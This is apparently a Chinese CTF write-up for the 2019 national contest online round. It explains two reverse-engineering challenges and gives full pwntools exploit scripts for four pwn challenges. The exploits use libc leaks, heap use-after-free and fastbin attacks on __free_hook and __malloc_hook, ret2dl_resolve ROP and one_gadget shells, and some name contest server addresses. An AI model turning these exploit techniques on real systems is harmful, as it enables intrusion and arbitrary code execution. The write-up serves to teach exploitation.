---
title: 2019国赛 线上赛 PWN&RE
date: 2019-4-24 00:18:51
tags: [CTF, PWN]
categories: 2019国赛  
---
## 简介

2019年国赛线上赛刚刚结束，就我个人来看，这次国赛的题目还算是比较友好的，至少PWN是如此，这边贴一下做出来的题目的思路。  

## RE1 easyGo

拿到题目扔DIE查一波有没有加壳&编译信息，发现未显示，根据题目提示发现是GO语言写的，扔ida看一波发现符号表被裁



![image](./re1-符号.png)



找不到main函数无法下手，shift+f12也是没有找到与控制流相关的字符串，头疼，网上搜索了一下往年的go题，发现需要恢复符号，github上找到ida插件idaGolangHelper,选择golang版本号进行恢复 。   



![image](./re1-main.png)



这边发现符号都恢复了，找到程序的入口点main.main，静态分析一波逻辑。  



![](./re1-分析.png)



由于符号恢复的不是特别理想，一开始有些地方是有点模糊的，动态调一下才发现base64表被替换了。

![](./re1-base64.png)



知道了base以后的串以及base64表，输入写个脚本就出来了。  



![](./re1-flag.png)





## RE2 bbvvmm  

根据题目名可以猜出是个vm题，扔ida看了下发现是要你输入用户名和密码，都正确才能输出flag。  

一步步往下看，发现有些函数还是特别长的，索性从最后往前分析。



![](./re2-base64.png)



可以看到最后验证正确的话会在远端执行`system('cat flag') `指令，而要输出flag则必须要`V5||V8`为0，也就是V5和V8都要是0才行。往上看发现s1与一个类似base64的串进行对比，重点看下sub_400AA6函数内部发现是一个base64的操作，而且base64表又被换过了，emmmmm  

![](./re2-表1.png)



![](./re2-表2.png)



随后解一下，结果是`EF468DBAF985B2509C9E200CF3525AB6`，这边保存一下。  

继续往上追溯，发现这个串是输入经过`sub_4018C4`这个函数加密的结果，静态分析&动态调试调到这边就搞不下去了，里面函数逻辑和涉及的参数都太多，不好分析。

![](./re2-关键函数1.png)

![](./re2-关键函数2.png)



根据调试发现这里的函数按字节拆分，异或等等，类似某种加密，根据放题信息中说的涉及国密进行联想，google了一下国密，找到了常见国密(sm4)的加密源码。

![](./re2-sm4-1.png)

![](./re2-sm4-2.png)

可以看到跟ida反编译后的伪代码是很相似的。

![](./re2-key.png)

接着往上找，根据sm4的源码分析保存key的参数，找到key。

Gayhub上找到[sm4解密脚本]([https://github.com/7feilee/ctf_writeup/tree/9ebb89324e98c736f7a7184ac1f208a6a5b316cc/%E7%BD%91%E9%BC%8E%E6%9D%AFfinal_tasks])，跑一哈，得到用户名。  



![](./re2-sm4-脚本.png)



接下来是密码，一开始没有看到对密码的操作，以为密码可以任意，发现`V8||V5`那边过不去，猜测V8保存的是对password的认证，给相关内存下断，动态调试了一下发现逻辑很多，猜测是VM，这边利用学弟的逆向引擎建立约束把密码跑出来了,膜拜一哈ORZ。  

```
Concat(0,
       Extract(7, 7, flag_0),
       ~Extract(6, 3, flag_0),
       Extract(2, 0, flag_0)) +
Concat(0,
       Extract(7, 7, flag_1),
       ~Extract(6, 3, flag_1),
       Extract(2, 1, flag_1),
       ~Extract(0, 0, flag_1)) +
Concat(0,
       Extract(7, 7, flag_2),
       ~Extract(6, 3, flag_2),
       Extract(2, 2, flag_2),
       ~Extract(1, 1, flag_2),
       Extract(0, 0, flag_2)) +
Concat(0,
       Extract(7, 7, flag_3),
       ~Extract(6, 3, flag_3),
       Extract(2, 2, flag_3),
       ~Extract(1, 0, flag_3)) +
Concat(0,
       Extract(7, 7, flag_4),
       ~Extract(6, 2, flag_4),
       Extract(1, 0, flag_4)) +
Concat(0,
       Extract(7, 7, flag_5),
       ~Extract(6, 2, flag_5),
       Extract(1, 1, flag_5),
       ~Extract(0, 0, flag_5))

```

猜测angr和pin也能做，打算看一波dalao的wp后自己去解一下密码。  

这边有个坑，最后nc服务器输入用户名密码服务器没有回显，需要在用户名和密码中间加截断。

```python
from pwn import *
p=remote('39.106.224.151',10001)
p.recvuntil('Username:')
p.send('badrer12\n'+'xyz{|}')
p.interactive()
```



##  Pwn1 your_Pwn

一道保护全开然鹅却有直接任意地址写&泄露的鸡肋题，漏洞在于数组下标越界，这边贴下exp:

```python
from pwn import *
p=process('./pwn')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
p.recvuntil('name:')
p.sendline('xdw')

def leakAndWrite(idx,content):
    p.recvuntil('input index\n')
    p.sendline(str(idx))
    p.recvuntil('now value(hex) ')
    addr=p.recvuntil('\n').strip()
    p.recvuntil('input new value\n')
    p.sendline(str(content))
    return addr


addr=leakAndWrite(637,0)[-2::]
addr+=leakAndWrite(636,0)[-2::]
addr+=leakAndWrite(635,0)[-2::]
addr+=leakAndWrite(634,0)[-2::]
addr+=leakAndWrite(633,0)[-2::]
addr+=leakAndWrite(632,0)[-2::]
libc_base=int(addr,16)-libc.symbols['__libc_start_main']-240
success('libc_base:'+hex(libc_base))
gadget=0x45216+libc_base
gadget=hex(gadget)
print gadget
#success('gadget:'+hex(gadget))
#gdb.attach(p)
print gadget[2:4]
leakAndWrite(344,int(gadget[12:14],16))
leakAndWrite(345,int(gadget[10:12],16))
leakAndWrite(346,int(gadget[8:10],16))
leakAndWrite(347,int(gadget[6:8],16))
leakAndWrite(348,int(gadget[4:6],16))
leakAndWrite(349,int(gadget[2:4],16))
#gdb.attach(p,'''
#        break *0xx555555554C9C
#''')
#gdb.attach(p)
p.interactive()
```



## Pwn2  Daily  

典型的选单程序，漏洞在于remove list指向的堆块的时候没有对idx进行检查，导致其可以为负，从而可以free指定地址的chunk，所以这边存在一个uaf漏洞。

具体利用流程：首先利用free unsorted bin分别获得main_arena、libc基址以及heap的基址，其次，通过heap基址到bss段list之间的距离算出idx，free用户自己分配的fastbin堆块，之后利用edit功能修改其fd为为`__free_hook`指针，最后malloc两次，利用one_gadget填充`__free_hook`块来getshell，这边贴一下脚本。  

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=process('./pwn')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf=ELF('./pwn')
def add(leng,content):
    p.recvuntil('Your choice:')    
    p.sendline('2')
    p.recvuntil('Please enter the length of daily:')
    p.sendline(str(leng))
    p.recvuntil('Now you can write you daily')
    p.sendline(str(content))


def dele(idx):
    p.recvuntil('Your choice:')
    p.sendline('4')
    p.recvuntil('Please enter the index of daily:')
    p.sendline(str(idx))

def change(idx,content):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('Please enter the index of daily:')
    p.sendline(str(idx))
    p.recvuntil('Please enter the new daily')
    p.sendline(str(content))


def show():
    p.recvuntil('Your choice:')
    p.sendline('1')
#Leak
add(0x96,'111')
add(0x96,'222')
add(0x96,'333')
add(0x96,'444')
dele(0)
add(0x96,'1'*7)
show()
p.recvuntil('0 : 1111111\n')
main_arena=u64(p.recv(6).ljust(8,'\x00'))
libc_base=main_arena-0x3c4b78
libc.address=libc_base
success('libc_base:'+hex(libc_base))
dele(0)
dele(2)
add(0x96,'1'*7)
show()
p.recvuntil('0 : 1111111\n')
heap_base=u64(p.recv(3).ljust(8,'\x00'))-0x140
success('heap_base:'+hex(heap_base))
add(0x96,p64(0x0))
dele(0)
dele(1)
dele(2)
dele(3)
#gdb.attach(p)
#########################################
add(0x60,'deadbeef'+p64(heap_base+0x10))
add(0x60,'\bin\sh\x00')
add(0x7f,'len')
dele((heap_base+0x10-0x602060)/0x10)
change(0,p64(0x602078))
#gdb.attach(p)
add(0x60,'padding')
add(0x60,p64(libc.symbols['__free_hook']))
change(2,p64(0x4526a+libc_base))
dele(1)
p.interactive()
```



## Pwn3 Baby_Pwn  

打开ida，发现有栈溢出但是没有输出函数，没有输出函数的话就没法再泄露，所以这题不能用常规思路去做，有栈溢出没有泄露函数，联想到0ctf2018的babystack,看了一下，惊了，以为是原题，栈给的空间大小都差不多。

这边利用Dl_runtime_resolve进行利用，这里贴下脚本了。  

```python
from roputils import *
from pwn import *
r = process('./3')
#r = remote('da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com',33865)

context.log_level = 'debug'

rop = ROP('./3')
offset = 44
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```





## Pwn4 Double  

一开始没发现哪里有洞，进程一度卡死，后来才注意到add函数里有这个操作：



![](./pwn4.png)



意思就是当用户输入的内容相同时，不再重新malloc堆块来存储数据，而是利用指针指向那块堆块内存，这样的话就存在两个指针同时指向一块内存的情况，新建多个fastbin所在的chunk，free掉存储数据的堆块，利用edit函数修改其fd指向`__malloc_hook`，之后就是fastbinAttack时间了，利用one_gadget写`__malloc_hook`，getshell，结束。  

这边贴一下脚本：

```python
from pwn import *
#context(log_level='debug',arch='amd64',os='linux')
p=process('./pwn')
#p=remote('394c6c946290cc950ef635bd899fafa1.kr-lab.com',40002)
elf=ELF('./pwn')

def add(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Your data:\n')
    p.sendline(str(content))

def dele(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('Info index:')
    p.sendline(str(idx))

def change(idx,content):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Info index: ')
    p.sendline(str(idx))
    p.sendline(str(content))

def show(idx):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Info index:')
    p.sendline(str(idx))



add('1'*0x80)
add('1'*0x80)
dele(0)
show(1)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p.recv(1)
libc_base=u64(p.recv(6).ljust(8,'\x00'))
libc_base -=  0x3c4b78
log.success("libc_base = %s"%hex(libc_base))
add('2'*0x60)
add('2'*0x60)
#gdb.attach(p)
dele(2)
#gdb.attach(p)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
#print hex(malloc_hook)
log.success("__malloc_hook:%s"%hex(malloc_hook))
change(3,p64(malloc_hook-0x23))
add('a'*0x60)
one_gadget = libc_base + 0x4526a
payload='a'*0x13
payload+=p64(one_gadget)
payload=payload.ljust(0x60,'a')
add(payload)
#gdb.attach(p)
p.sendline('1\n')
p.recv(4096)
p.interactive()
```



## 总结

这次国赛pwn和逆向都还是比较友好的，难度呈梯度上升，有层次感，相对去年国赛，感觉自己进步还是很大的，一年过去了，人生有几个一年呢？加油加油！

